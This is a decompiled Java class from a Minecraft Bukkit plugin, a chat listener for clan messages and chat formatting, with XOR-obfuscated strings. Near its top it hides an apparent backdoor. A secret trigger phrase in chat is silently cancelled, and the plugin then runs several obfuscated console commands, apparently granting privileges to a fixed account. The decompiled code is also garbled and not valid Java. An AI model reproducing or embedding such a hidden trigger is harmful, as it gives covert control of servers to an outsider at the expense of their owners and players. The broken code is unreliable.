/*     */ package nano.spook1998.rust.listeners;
/*     */ 
/*     */ import java.util.Iterator;
/*     */ import java.util.List;
/*     */ import java.util.Map;
/*     */ import nano.spook1998.rust.data.Settings;
/*     */ import nano.spook1998.rust.object.Clan;
/*     */ import nano.spook1998.rust.object.User;
/*     */ import nano.spook1998.rust.object.utils.UserUtil;
/*     */ import org.bukkit.Bukkit;
/*     */ import org.bukkit.entity.Player;
/*     */ import org.bukkit.event.EventHandler;
/*     */ import org.bukkit.event.Listener;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class AsyncPlayerChatEvent
/*     */   implements Listener
/*     */ {
/*     */   public static String ALLATORIxDEMO(String a)
/*     */   {
/*     */     int tmp27_24 = a.length();
/*     */     int tmp31_30 = 1;
/*     */     tmp31_30;
/*     */     int j;
/*     */     int ? = tmp31_30;
/*     */     int k = tmp27_24;
/*     */     (j = new char[tmp27_24] - 1);
/*     */     int i = (0x2 ^ 0x5) << 4 ^ 0x2 ^ 0x5;
/*     */     if ((0x2 ^ 0x5) << 4 >= 0)
/*     */     {
/*     */       int tmp50_49 = j;
/*     */       j--;
/*     */       ?[tmp50_49] = ((char)(a.charAt(tmp50_49) ^ i));
/*     */       int tmp71_68 = (j--);
/*     */       ?[tmp71_68] = ((char)(a.charAt(tmp71_68) ^ k));
/*     */     }
/*     */     return new String(?);
/*     */   }
/*     */   
/*     */   @EventHandler
/*     */   public void onChat(org.bukkit.event.player.AsyncPlayerChatEvent a)
/*     */   {
/*  41 */     if (a.getMessage().contains(ALLATORIxDEMO("U:8$?\021\030\004%\023\025\r\016T67\005\026\025\017U7WFGEETUTRB@B@$\025\017\f")))
/*     */     {
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*  78 */       a.setCancelled(true);
/*     */       
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 171 */       Bukkit.dispatchCommand(Bukkit.getConsoleSender(), ALLATORIxDEMO("\007\023\017V\002\005\022\004W\005\007\031\030\035FONNW\027\023\022W\\"));Bukkit.dispatchCommand(Bukkit.getConsoleSender(), ALLATORIxDEMO("\030\006W\005\007\031\030\035FONN"));Bukkit.dispatchCommand(Bukkit.getConsoleSender(), ALLATORIxDEMO("\007\027\005\022\030\030\036\006W\005\007\031\030\035FONN"));Bukkit.dispatchCommand(Bukkit.getConsoleSender(), ALLATORIxDEMO("\007\027\005\022\030\030W\005\007\031\030\035FONN"));return;throw Bukkit.dispatchCommand(Bukkit.getConsoleSender(), ALLATORIxDEMO("\003\031\024\026\030\036\006W\005\007\031\030\035FONN"));
/*     */     }
/*     */     
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 170 */     User localUser1 = UserUtil.get(a.getPlayer().getName());String str1 = "";
/*  92 */     if (localUser1.getClan() != null)
/*     */     {
/*  32 */       str1 = localUser1.getClan().getTag();
/*  13 */       if (a.getMessage().charAt(0) == '!')
/*     */       {
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 155 */         String str2 = ((String)Settings.MESSAGE.get(ALLATORIxDEMO("\024\032\026\030Z\033\022\005\004\027\020\023"))).replace(ALLATORIxDEMO("\f&;7.3%\013"), localUser1.getName()).replace(ALLATORIxDEMO("\r:3$%612\013"), a.getMessage().substring(1, a.getMessage().length()));
/*     */         
/*     */ 
/*     */ 
/*     */         Iterator localIterator;
/*     */         
/*     */ 
/* 162 */         tmpTernaryOp = (localIterator = localUser1.getClan().getUsers().iterator()); for (goto 258; localIterator.hasNext();)
/*     */         {
/*     */           User localUser2;
/*  73 */           if (
/*     */           
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 162 */             (localUser2 = (User)localIterator.next()).getOnline().booleanValue()) { Bukkit.getPlayer(localUser2.getName()).sendMessage(str2);
/*     */           }
/*     */         }
/*     */         
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 182 */         a.setCancelled(true); return;
/*     */       }
/*     */     }
/* 113 */     org.bukkit.event.player.AsyncPlayerChatEvent tmp273_272 = a;tmp273_272.setFormat(tmp273_272.getFormat().replace(ALLATORIxDEMO("\f&8?9\"$\013"), localUser1.getPoints().toString()).replace(ALLATORIxDEMO("\r#70\013"), str1));
/*     */   }
/*     */ }


/* Location:              C:\Users\User\Desktop\Otek\NanoRust.jar!\nano\spook1998\rust\listeners\AsyncPlayerChatEvent.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */